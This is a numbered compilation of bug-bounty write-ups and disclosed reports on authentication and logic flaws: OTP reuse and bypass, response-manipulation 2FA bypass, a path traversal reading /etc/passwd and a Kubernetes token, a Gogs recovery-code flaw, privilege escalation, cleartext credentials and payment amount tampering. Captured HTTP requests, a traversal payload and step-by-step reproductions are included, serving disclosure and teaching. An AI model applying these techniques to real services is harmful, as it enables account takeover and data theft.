Entered OTP A instead of the new OTP
Login successful ;)

The same OTP worked across:

Passwordless login
2FA verification
Different sessions
Different authentication methods
Impact

The OTPs were not being invalidated after use, which meant that a previously generated OTP could be reused across different sessions, browsers, 
and even completely different authentication flows. In simple terms, once an OTP was valid, it stayed loyal a little longer than it should have.

Final Thoughts

What initially appeared to be a low‑impact OTP issue slowly evolved into a critical authentication flaw once combined with 2FA and passwordless
login flows. Sometimes a rejected report isn’t wrong, it’s just incomplete.

Lesson:
Authentication bugs rarely live alone. They wait patiently to be combined… and then cause trouble.

Number: 41
title: Interesting OTP Validation Logic 🥷 Flaw: Registering Any Victim’s Email Without Inbox Access 🔑 Using Wrong OTP to Bypass Email/OTP Verification
id: writeup by Ch4rlii

Category:- CWE-287: Improper Authentication + CWE-840: Business Logic Error
Severity: Medium (P3)

The normal registration flow of the application was something like this:

Navigate to the registration page → Enter your email address → A 4-digit OTP is sent to the provided email → Enter the OTP on the second page to verify the email → After successful OTP verification, proceed to the third page to set a username and password → Once credentials are created, access to the account is granted.

My Test Case:
As part of my testing, I entered my own email address on the registration page and received a 4-digit OTP in my inbox. I entered the OTP on the second page, clicked “Verify Email”, and captured the request using Burp Proxy.

When analyzing the OTP request, I noticed that the request body did not contain any parameter for the email address. This indicated that the application was not verifying which email the OTP actually belonged to. Instead, the validation was only dependent on the active session and tokens. I noted this behavior for further investigation.

POST /registration/verify HTTP/2
Host: user.example.com
Cookie:  .
         .
         . ## Session tokens and Others Cookies 
         .
         .

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://user.example.com/registration/verify
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
X-Csrf-Token: SaomsCSCSA835adaeeEn4yfgIrE1PTFnrAnEHRFS3SM0ukdjVz6JTRB2LHPZSnhMwWafh3e83453cebsa
Content-Length: 169
Origin: https://user.example.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

authenticity_token=SaomsCSCSA835adaeeEn4yfgIrE1PTFnrAnEHRFS3SM0ukdjVz6JTRB2LHPZSnhMwWafh3e83453cebsa&code1=1&code2=8&code3=5&code4=1&code=1851&commit=Verify email
Next, I analyzed the response of a valid OTP request. The response contained two important headers and a redirect script that redirected users to the sign-up page upon successful verification:

## Valid OTP Response

HTTP/2 200 OK
Date: Fri, 1 Aug 2025 07:56:59 GMT
Content-Type: text/javascript; charset=utf-8
Location: https://user.example.com/auth/sign_up
Cache-Control: no-store
Content-Security-Policy: default-src 'self' https:; font-src 'self' https: data:; img-src 'self' https: data:; object-src 'none'; script-src 'self' https: 'unsafe-inline'; style-src 'self' https: 'unsafe-inline'; frame-ancestors 'self' https: https://next.example.com
Etag: W/"9db3206f14e758ac3a8f209d7e1b46c2"
Pragma: no-cache
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: xxx_session=7fb41dce902a3b6e5c0d19f27aa8e54c; domain=.example.com; path=/; expires=Mon, 10 Aug 2025 07:56:59 GMT; secure; HttpOnly; SameSite=Lax
Set-Cookie: xxx_session_refresh=; path=/; max-age=0; expires=Thu,00:00:00 GMT; SameSite=Lax; secure; HttpOnly
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 51eac97f08329de46f0b34a2cd19b87a
X-Runtime: 0.023491
X-Xhr-Redirect: https://user.example.com/auth/sign_up
X-Xss-Protection: 1; mode=block
Cf-Cache-Status: DYNAMIC
Server: cloudflare
Cf-Ray: 1507d0e47b194652-BOM

Turbolinks.clearCache()
Turbolinks.visit("https://user.example.com/auth/sign_up", {"action":"advance"})
1:- Location: https://user.example.com/auth/sign_up

2:- X-Xhr-Redirect: https://user.example.com/auth/sign_up
The script looked like this:

Turbolinks.clearCache();
Turbolinks.visit("https://user.example.com/auth/sign_up", {"action":"advance"});
I saved these values for later use😁.


To exploit the logic flaw, I dropped the response of the valid OTP request and refreshed the browser. After the refresh, the application redirected me back to the registration page. This time, instead of my own email, I entered the victim’s email address (to which I had no access). Since I did not have access to the victim’s mailbox, I simply used a random 4-digit OTP (e.g., 1111) and intercepted this request.

While analyzing the response of this invalid OTP request, I noticed that the request was still using the same cookies and session tokens from my previously valid OTP session, even though I had entered a different email address. Normally, when a wrong OTP is entered, the application redirects back to the first page and asks the user to re-enter the email and validate the OTP again — but here I modified the response.

## Wrong OTP Response

HTTP/2 200 OK
Date: Fri, 1 Aug 2025 07:56:59 GMT
Content-Type: text/javascript; charset=utf-8
Location: https://user.example.com/registration/verfiy
Cache-Control: no-store
Content-Security-Policy: default-src 'self' https:; font-src 'self' https: data:; img-src 'self' https: data:; object-src 'none'; script-src 'self' https: 'unsafe-inline'; style-src 'self' https: 'unsafe-inline'; frame-ancestors 'self' https: https://next.example.com
Etag: W/"9db3206f14e758ac3a8f209d7e1b46c2"
Pragma: no-cache
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: xxx_session=7fb41dce902a3b6e5c0d19f27aa8e54c; domain=.example.com; path=/; expires=Mon, 10 Aug 2025 07:56:59 GMT; secure; HttpOnly; SameSite=Lax
Set-Cookie: xxx_session_refresh=; path=/; max-age=0; expires=Thu,00:00:00 GMT; SameSite=Lax; secure; HttpOnly
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: c138e0a47fd26b93a50c79d1ee42fa69
X-Runtime: 0.023491
X-Xhr-Redirect: https://user.example.com/registration/verfiy
X-Xss-Protection: 1; mode=block
Cf-Cache-Status: DYNAMIC
Server: cloudflare
Cf-Ray: 1507d0e47b194652-BOM

Turbolinks.clearCache()
Turbolinks.visit("https://user.example.com/registration/verfiy", {"action":"replace"})
I replaced the two redirect headers and the redirect script in the invalid OTP response with the ones from the valid OTP response. After forwarding this modified response, the browser redirected me to the username and password setup page.

Download the Medium app
Although a pop-up appeared saying “Invalid verification code, please try again”, I ignored it, completed the username/password setup, clicked “Create Account”, and was redirected to the account settings page to set up 2FA. I successfully completed the setup using my mobile device.

Note: Normally, if a wrong OTP is entered during registration, the application redirects back to the second page and asks the user to re-enter the correct OTP. But if an attacker exploits this logic flaw, they get redirected straight to the third page, where the application allows them to set a username and password. On that third page, a message still appears saying the OTP was invalid — meaning the Backend / Server is checking the OTP after the redirection. It’s like the Backend / Server is saying: “Sorry 😔 I checked the OTP a bit too late.” 😆


Normal Validation Flow
Key Observation👀:

I also noted another important point: if you first enter the victim’s email and submit a wrong OTP, then try to convert that response into a valid OTP response and forward it, the attack does not work — the application still asks for the correct OTP. However, if you first enter your own email as an attacker, capture and drop the request/response of the OTP you receive, then refresh the browser and enter the victim’s email, and only then use this logic flow, the vulnerability can be exploited successfully. In other words, the bypass works only in this sequence and not by simply modifying a wrong OTP response.

Press enter or click to view image in full size

Logic Flaw On OTP Validation
Thus, I was able to register an account using the victim’s email without access to their inbox or the actual OTP. The victim remained completely unaware, while an attacker could silently abuse this OTP validation logic flaw to create and control accounts with arbitrary email addresses.

🌱 Root Cause of the Vulnerability:
This vulnerability exists due to improper binding between the OTP, the email address it was generated for, and the server-side session that handles the registration process. During user registration, when an OTP is requested, it is tied only to the active session via a session cookie and authenticity token — not directly or securely bound to the specific email address submitted.

When the attacker enters their own email address and completes OTP verification successfully, the server responds with redirection headers (Location, X-Xhr-Redirect) and a frontend navigation script (Turbolinks.visit(…)) that advance the user to the account setup stage. If the attacker intercepts and saves this response, and then drops the request (so that account creation is not completed), the session remains active in the browser, still marked as “OTP verified.”

Later, the attacker refreshes the page or clicks a reference button in the browser and attempts to register a new account using a different email address, such as a victim’s. The server issues a new OTP to the victim’s email, but the attacker enters a random or incorrect OTP. At this point, instead of letting the invalid attempt proceed, the attacker intercepts the OTP verification response and modifies it by injecting the previously captured redirect headers and Turbolinks script from the valid session. Because the same session token and cookie are still active, the backend assumes the session is already verified — and does not check whether the OTP being submitted actually belongs to the new (victim) email address.

The frontend then blindly follows the spoofed redirection instructions, allowing the attacker to proceed to the password and username setup stage for the victim’s email. The attacker can now complete the account creation on behalf of the victim and even enable 2FA. Since the real user never receives or verifies the OTP, they are unaware that an account has been created using their email. In the future, when they try to register or reset their password, they will be blocked at the 2FA screen — which only the attacker can control.

I: The vulnerability stems from several combined issues:
II: Session-level OTP trust without strict email binding
III: Lack of session re-initialization between registration attempts
IV: Frontend trust in redirect headers and scripts
V: No revalidation of OTP/email match during account creation
These flaws together allow a complete bypass of the OTP verification step.

So, I successfully created a report for this bug, calculated the CVSS score, and forwarded it to the company.

Number: 42
title: How a Simple “Having Issue?” Feature Opened the Entire Server ?
id: writeup

The Backstory
During a freelance Vulnerability Assessment and Penetration Testing (VAPT) engagement, I was tasked with testing a web application belonging to a well-known banking platform.

There are moments during a security assessment when everything feels routine. The application behaves as expected, the controls seem mature, and most of the obvious attack surfaces appear hardened.

Following a Real User Journey
Let’s get started
To properly understand the behavior of the website, I logged in as a normal user, with no special privileges and no elevated roles.

From the dashboard, I initiated a standard fund transfer. The process was exactly what you would expect from a banking application:

I selected a source account, entered a destination account, specified an amount, provided the transaction PIN, and submitted the request.

Once the transaction was processed, the application responded in one of only two ways:

Either the payment succeeded, or it failed.

This part was straightforward.

What caught my attention was what happened next.

The “Having Issue?” Button
Regardless of whether the transaction succeeded or failed, the interface displayed a small option labeled:

“Having Issue?”

At first glance, this looked like a harmless customer-support feature. Something designed to improve user experience by allowing customers to report transaction-related problems.

Clicking it opened a panel on the left side of the screen.

Inside this panel, the user could submit details such as:

A description of the issue
The amount involved
The issue category
And crucially…

There was an option to upload files → Screenshots. Proof. Supporting documents.

From a usability standpoint, this made sense.
From a security standpoint, it immediately raised questions.

Observing the File Upload
The request was sent to the following endpoint:

POST /api/upload-document
Host: [REDACTED]
Content-Type: multipart/form-data
The content type was multipart/form-data, as expected.

Nothing unusual so far.

But the response was far more interesting than the request.

A Response That Revealed Too Much
The server responded with a JSON object containing detailed metadata about the uploaded file. Among the fields returned were internal identifiers, file type information, and a direct URL path referencing the uploaded document.

Press enter or click to view image in full size

One field stood out immediately:

This response leaked a direct download endpoint.

"fileUrl": "/api/upload-document/downloadDocs?fileName=468074212.paymentfailed.png"
This was a moment worth pausing on.

The backend was not only accepting user uploads, but it was also explicitly telling the client how to download them.

Testing the Download Endpoint
I copied the file URL from the response and accessed it directly in the browser:

Join The Writer's Circle event
By accessing the FileUrl directly:

https://[REDACTED]/api/upload-document/downloadDocs?fileName=468074212.paymentfailed.png
I was able to download the uploaded file without any authentication checks.

That alone is a Broken Access Control issue.

But it didn’t stop there.

At this point, the issue was already significant. But curiosity and experience suggested testing further.

The Moment Everything Changed
Whenever a backend exposes a file download mechanism that relies on user-supplied input, one question must always be asked:

What happens if the input is not a filename?

So I modified the request.

Instead of providing the name of an uploaded file, I supplied a path traversal payload.

GET /api/upload-document/downloadDocs?fileName=../../../../../../etc/passwd
I sent the request.

The server responded.


At that moment, it became clear that this was not just a misconfiguration or a minor oversight. This was a full-fledged arbitrary file read vulnerability in a production banking environment.

Exploring the Filesystem by Path Traversal
To confirm the extent of access, I tested additional files.

System-level files were accessible.
Configuration files were accessible.
Most alarmingly, files associated with containerized infrastructure were accessible.
One such example was:

/var/run/secrets/kubernetes.io/serviceaccount/token
The successful retrieval of this file confirmed that the application was running inside a Kubernetes cluster and that the backend service account token was 
readable through this endpoint.

This dramatically increased the impact of the vulnerability.

What began as a customer support feature had now exposed the underlying infrastructure layer.

Beyond File Read
With access to sensitive system files and Kubernetes secrets, the attack surface expanded dramatically.

Configuration data reveals how applications are deployed.
Service account tokens reveal how workloads authenticate internally.
Internal file paths reveal runtime behavior.

By chaining this information, it became possible to move far beyond simple file disclosure.

This vulnerability could be escalated into full Remote Code Execution.

That full chain deserves its own dedicated write-up and it will get one.

Closing Thoughts
Sometimes, the path to the most critical impact starts with a button that simply says:

“Having Issue?”

Number: 43
title :  EMAIL change without password and 2FA (Response Manipulation Simple BUG)
id: 
The Mindset: Chill, Curious, and Slightly Annoyed by “Secure” Theater
I don’t chase CVEs. I don’t race to be first. I’m just a beginner in bug bounty who likes asking: “What if this isn’t as solid as it looks?”

Also, full disclosure:

I once tried logging in with a password made of 10 Zero Width Spaces (U+200B).
The system accepted it, reset my password, and emailed me a confirmation that literally said:
“Your new password is:<space>”

Me, staring into the void: “Ah. So we’re doing interpretive dance security now.”

That’s the thing about invisible characters — they’re not just for blank WhatsApp messages (shoutout to blanktext.net ). Sometimes, they reveal how little a system actually validates what you give it.

But this story isn’t about Unicode. It’s about something even simpler: a single JSON field that lied — and the server believed it.

The Discovery: “Verify Your Identity”… Or Just Pretend To?
I started where most do: testing password reset flows, 2FA bypasses on login, token reuse. Nothing worked — REDACTED.COM had locked down the front door properly.

So I moved inward.

After logging in (with 2FA enabled), I went to Account Settings → clicked “Update” next to my email. The page responded with:

“First, verify your identity.”
→ Password field
→ 2FA prompt

Perfect. That’s how it should be.

But instead of entering my real password, I typed “wrongpass” and hit Continue.

In Burp Suite, I saw the request to /users/challenge return:

{ “success”: false, “errorCode”: “invalid-credentials” }

Expected. Boring.

Then — because I’ve seen too many apps trust the client — I changed it to:

{ “success”: true, “errorCode”: “” }

I forwarded the response.

And instead of an error like “Password required” or “2FA code invalid”…
I was instantly redirected to the “Enter your new email” page.

No challenge. No code. No second thought.

I typed attacker@gmail.com, clicked Change Email, and got:
✅ “Email updated successfully.”

I hadn’t proven anything. But the app acted like I’d passed every test.

The Vulnerability: When the Frontend Lies and the Backend Nods
This was a critical post-authentication bypass.REDACTED.COM enforced password + 2FA on the frontend, but the backend never validated whether the user had actually completed the verification before allowing the email change.

Become a Medium member
The /users/challenge endpoint was treated as a gate—but the gatekeeper was asleep. The UI only checked if the response said "success": true. It didn’t matter how it got there.

Impact?
An attacker with temporary access to a logged-in session (via XSS, session theft, or shared device) could:

Bypass both password and 2FA,
Change the victim’s email,
Trigger a password reset,
And fully hijack the account.
All because the system confused UI state with authentication truth.

Steps to Reproduce
Log in to REDACTED.COM with 2FA enabled.

Go to Account Management → click Update next to email.

On the “Verify your identity” screen, enter an incorrect password and click Continue.

Intercept the /users/challenge response in Burp Suite.

Change "success": false → "success": true.

Forward the response.

Observe: you’re immediately redirected to the email input form — no 2FA, no error and no password.

Enter any email (e.g., attacker@gmail.com) and submit.

Confirmation appears: “Email changed successfully.”

Attacker now controls account recovery.

How to Fix It (3 Simple Rules)
Never trust client-reported auth status.
The backend must independently verify that a valid password and a fresh 2FA token were submitted in the same session before allowing sensitive actions.
Use short-lived verification tokens.
After successful 2FA, issue a one-time token (e.g., verify_token=abc123). The email change request must include this token—or be rejected.
Treat post-login actions as high-risk.
Being logged in ≠ permission to change identity-critical fields. Always re-validate.
Final Thoughts
I didn’t need a memory corruption exploit or a side-channel leak.
I just needed one mutable boolean — and a system that trusted it too much.

This bug wasn’t hidden in complexity. It was hiding in complacency: the assumption that “if the user is logged in, they’ve already proven who they are.”

But identity isn’t a one-time event. It’s a continuous contract. And if you don’t enforce it on the server, you’re not securing accounts — you’re staging a play.

I reported this responsibly. REDACTED.COM patched it quickly.
And I went back to testing whether U+3164 (Hangul Filler) can crash a login form.

Because in security, the quietest bugs don’t scream.
They just sit there… invisible… waiting for someone to ask:

Number: 51
Title: Business Logic Vulnerability lead to PII theft & account take over
id: Writeup by zack0x01

The logic of the app is easy : if the user is registered ( have an account ) , whne you go to make a purchase as a guest user , 
it shows “sorry this user already exist you need to login first “ , but if you use an email that have never registered befor you
can make an order as a guest user

Here’s how it works 👇

The victim places an order as a guest using their email address.
Once the order is complete, the attacker creates a new account using that same victim email address.
Because the application does not verify email ownership, the newly created account gets linked to the victim’s existing guest order.
The attacker can now see the victim’s order details, including sensitive PII such as name, phone number, and address.
Additionally, the attacker can modify account details, effectively taking over the victim’s account.
If you try to make a purchase using another already registered account, the system correctly prompts you to log in first — meaning this behavior only affects guest 
checkout users, which makes it a clear authorization issue caused by improper business logic handling.

This type of bug can have a high impact since it allows an attacker to access private user data and control over accounts without any interaction from the victim.

Impact:
Full Account Takeover
PII Disclosure (Name, Email, Address, Phone Number)

Number: 52
Title: Gogs Vulnerable to 2FA Bypass via Recovery Code
id: Github's Writeup by GPT Security Team

Vulnerability Details
The function UseRecoveryCode in internal/database/two_factor.go fails to check that the recovery code belongs to the authenticating user. Instead, it looks for any unused 
recovery code:
Vulnerable Code Snippet

func UseRecoveryCode(_ int64, code string) error {
    recoveryCode := new(TwoFactorRecoveryCode)
    has, err := x.Where("code = ?", code).And("is_used = ?", false).Get(recoveryCode)
    ...
}
Although the caller passes userID, it is ignored. The result is a global lookup for any unused code, allowing an attacker to submit their own recovery 
code during another user's login flow.

Impact
2FA rendered ineffective for all users
Realistic Exploitation Scenarios
Public Gogs instances with 2FA enabled
Developer or maintainer accounts
Enterprise self-hosted Gogs servers
Potential Impact
This vulnerability critically undermines 2FA. Since recovery codes are not globally unique and lack user scoping, any attacker with victim credentials can
use one of their own recovery codes to complete login as the victim — bypassing all 2FA protections. This opens the door to account hijacking, data exfiltration, 
and downstream supply chain compromise.
Timeline
August 2025: Discovered via GPT5
August 2025: Reproduced and confirmed via PoC and sanitizer
Aug 6, 2025 - Sent to Gogs via https://github.com/gogs/gogs/security/advisories/new

Number: 53
Title: Leaking CSRF token over HTTP resulting in CSRF protection bypass
id: Hockerone 15412

Start a proxy tool like Burp.
Authenticate to the Coinbase application.
Navigate to the URL https://coinbase.com/docs/api/overview
Under Developer Updates, enter your email address and click "Subscribe".
Notice that this request is sent over HTTP with the CSRF token in the body of the POST request.
This means that an attacker can easily perform a MiTM attack and gain access to this CSRF token. The attacker can then trick this authenticated Coinbase user to 
perform CSRF attacks since the attacker now knows the CSRF token associated with this user. 
This results in bypassing the existing CSRF protection in the Coinbase application.

Number: 54
Title: Organization Admin Privilege Escalation To Owner
id: Hackerone 272570

Summary
It seems there is an issue with your roles which allows an admin to escalate his own privileges to owner and takeover the organization.
Reproduce
Create an account, accountA
Create another account, accountB
Create an organization under accountA and invite accountB to that organization as admin
Accept invitation with accountB and log out
Confirm accountB for the organization on accountA
Log in with accountB
Navigate to the organization -> invite users -> edit accountB user and change to owner
See that the change worked and accountB is now owner.
To proceed with organization takeover, remove the original owner
Note that (after login and logout) the original owner no longer is in the organization
Impact
Anyone who is an admin on an organization can take total control of the organization and kick the original owner out.
Request
Could you please whitelist ip 173.167.43.57 and ip 54.197.209.98 so that I can keep reporting? It is very hard to fully test the application while I am constantly 
getting blacklisted and having to use my phone as a hotspot :P If not, that's cool, just figured I'd ask :)
Thanks,
Justin Gardner

Number: 55
Title: [Privilege Escalation] Authenticated users can manipulate others fullname without their knowledge 
id: 244567

Summary
I have found a vulnerability, Which is you can change/update others Fullname without there knowledge.
Step-by-step Reproduction Instructions
1.) login your account https://wakatime.com/login
2.) after you login go to Leaderboard then click Create new one or in easy way is to go here https://wakatime.com/leaders/new
3.) Now put any name you want e.g. Test then hit Ceate Leaderboard
4.) Then you will see Leaderboards · Test · Notifications or notification page, something like that, then just click Daily
5.) Go to Members Panel and invite other users. just fill the fullname any name you want e.g. test then fill up the target email e.g. ██████@gmail.com then hit Send Invitation
6.) after you do step 5. you will see the inviteded victim in Members panel
7.) You will notice the Edit Icon on the Victim fullname, Click that.
8.) Them prompt box will pop up saying Enter new name for Test, then just put the Fullname in input a value e.g. HACKED.
9.) Now go login the victim email, and you will notice that the fullname of the victim was change into HACKED



Number: 56
Title: Non-secure requests are not automatically upgraded to HTTPS
ID: 158186

Non-secure requests to hackerone.com (e.g. http://hackerone.com) are not automatically upgraded to HTTPS. This is not something you would notice when 
you use the latest version of modern web browsers such as Google Chrome or Firefox, because hackerone.com is HSTS preloaded. When a domain is preloaded,
non-secure requests for these domains are internally upgraded to HTTPS. However, there are still browsers 
that either haven't implemented HSTS preload lists, or don't have hackerone.com on their HSTS preload lists (yet).
Take for example Safari on iOS, which doesn't have hackerone.com in its HSTS preload list. When you open http://hackerone.com in Safari and head over to 
the 'Sign in' page you will see that the connection is not upgraded to HTTPS. Moreover, if you enter your username and password, and hit 'Sign in', the form
is sent in the clear over a non-secure connection.
Since non-secure requests aren't upgraded to HTTPS, the user will never receive instructions (via the Strict-Transport-Security header) to set the HSTS "cookie"
for 'hackerone.com. Which means a secure connection is not enforce until the first time the requests a resource over HTTPS, because that response will include the
Strict-Transport-Security` header.
Steps to reproduce
cURL
Send a HEAD request to http://hackerone.com: curl -I http://hackerone.com.
You will see that the server does not instruct the client to upgrade the connection to HTTPS. The server responds with a 200 OK status code instead of 301 status
code with the response header Location set to https://hackerone.com.
Firefox
Clear the Site Preferences: Click History --> Clear Recent History..., select Everything, tickSite Preferences, and hit Clear Now. This is to ensure Firefox forgets
about an HSTS settings for hackerone.com.
Turn off the use of the HSTS preload list. Set network.stricttransportsecurity.preloadlistto false on the about:config page.
Open http://hackerone.com.
You will see that the non-secure connection is not upgraded to HTTPS.
Also note that when you click Sign in in the top-right corner, enter your email address and password, and hit the green Sign in button that your credentials are sent
in the clear to the non-secure endpoint http://hackerone.com/sessions.
Exploitability and impact
Granted, it is kind of hard to exploit this vulnerability, because, first of all, it requires an attacker to be in a privileged network (he/she needs to be able to see
what's going over the wire). Then the attacker would need to trick the victim into opening http://hackerone.com in a browser that doesn't have hackerone.com HSTS preloaded
and which doesn't have any HSTS cookies for hackerone.com from a previous secure visit to hackerone.com. When all these conditions are met, an attacker could for example
steal the victim's HackerOne credentials, or inject some malicious scripts into any page. This is possible because the connection is never upgraded, and the site allows
forms such as the login form to be posted to a non-secure endpoint (see the screenshot attached to this report).
Mitigation
Non-secure connections need to be upgraded to HTTPS as soon as possible using a permanent redirect. But since the website allowed me to send my username and password in the
clear over a non-secure connection, I was also thinking that you would probably want to prevent forms from being posted to non-secure origins. One possibility is to enforce 
the client to only send AJAX requests to secure origins using the Content Security Policy connect-src directive.

Number: 57
Title: privilege escalation
ID: 13959

niks submitted a report to Automattic.
May 29, 2014, 9:09am UTC
This vulnerability includes privileges escalation, authentication bypass, as well as some information disclosure as well. follow the below steps for reproduction.
go to https://cloudup.com and make two accounts say X and Y.
login with the account X and upload a file(can be txt,php,anything) and set a password for this file, now right click on download and copy the link location of the file.
It is something like (https://cloudup.com/files/iDQ23wk5p1O/download)
Now logout from account X, and login with account Y. Now load the link location of file copied in step 2. what you will get? Forbidden, right?
But wait a second, modify the url mentioned in step 2 like below https://cloudup.com/files/iDQ23wk5p1O/ (remove the download part)
Load the above modified url, and you will see, you can access the file contents i.e. password protected file (authentication bypass), accessed by another user who is not
authorized (privilege escalation) and information disclosure like "exif":{"exiftool version number":"9.35","file name":"HiTmbEE-C2","directory":"/tmp/thumbs",
"file size":"46 kB","file modification date time":"2014:05:29 08:37:22+00:00","file access date time":"2014:05:29 08:37:22+00:00","file inode change date 
time":"2014:05:29 08:37:22+00:00","file permissions":"rw-rw-r--"
 
posted a comment. 
May 29, 2014, 9:20am UTC
i am attaching poc of two files,
cloudup1.jpg -> uploaded file was image having password protection
cloudup2.jpg -> uploaded file was text file having password protection

Number: 58
Title: Login credentials transmitted in cleartext on index.rubygems.org
ID:  #173268

If someone links their target to http://index.rubygems.org then if they click "sign in" their credentials are transmitted plaintext as there is no https 
redirect or enforcing of https on the login form.
Step 1: Link to http://index.rubuygems.org
Step 2: sniff traffic (open wifi / proxy / etc)
See the following parameters POST to the session endpoint. The user is confronted with an error since the session cookie is marked secure so they can't 
continue to logged in resources. But the attacker already has their username and password:
Request captured.
Code

POST /session HTTP/1.1
Host: index.rubygems.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://index.rubygems.org/sign_in
Cookie: _gauges_unique_hour=1; _gauges_unique_day=1; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; _ga=GA1.2.406017651.1475277378
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Post Data Captured:
Code

utf8=✓
authenticity_token=9dML75aXwXcw4rqJlOeKDK2/SdRK78+5ciMEtrMbDgEf160r9v1TX0/pXynzDC+pYSp5M1oGLsmtvkixo+MfdA==
session[who]=Eterm1
session[password]=5[redacted]W
commit=Sign+in
Furthermore, _rubygems_session cookie is transmitted over http. It has a "secure" flag which stops the client resubmitting over http, but an attacker can see it clear
in the response headers.

Number: 59
Title: Business Logic Vulnerability in Dell’s Payment API — Reported via Bugcrowd
ID: Writeup 

Vulnerability Summary

We discovered that Dell's UPI payment processing API lacked proper validation of payment amounts. This allowed an attacker to alter the request payload 
and manipulate the price reflected in the server's response — opening the door to financial inconsistencies and potential fraud.

---

Proof of Concept (PoC)

We initiated a UPI payment with the following crafted payload:

{
"upiPaymentDetails": {
"paymentId": "70f10e98-f618-4c25-ad3b-f1304f2371c3",
"amount": 1.00,
"payCode": "UPI"
},
"nonAppliedPayment": {
"payCode": "UPI"
},
"paymentProcessType": "Register",
"paymentCategoryName": "upi",
"isPaymentAncillaryDataRequired": true
}

Server Response:

{
"upiPaymentDetails": {
"amount": 1.00,
"paymentId": "70f10e98-f618-4c25-ad3b-f1304f2371c3",
"payCode": "UPI",
...
}
}

Even though a modified price was sent, Dell’s API accepted and responded with it. This created a logic flaw where amount tampering could occur without validation.


Screenshot 1: Manipulated Price
Press enter or click to view image in full size

Screenshot 2: API Response with Altered Amount

Screenshot 3: Payment Completion on Gateway
---

Write on Medium
Impact

This vulnerability posed significant risks:

Financial Risk: Potential loss through price manipulation.

Integrity Violation: ACID property (Consistency) was compromised.

Reputation Risk: Errors in payment processes erode customer trust.

Number: 60
Tille: 
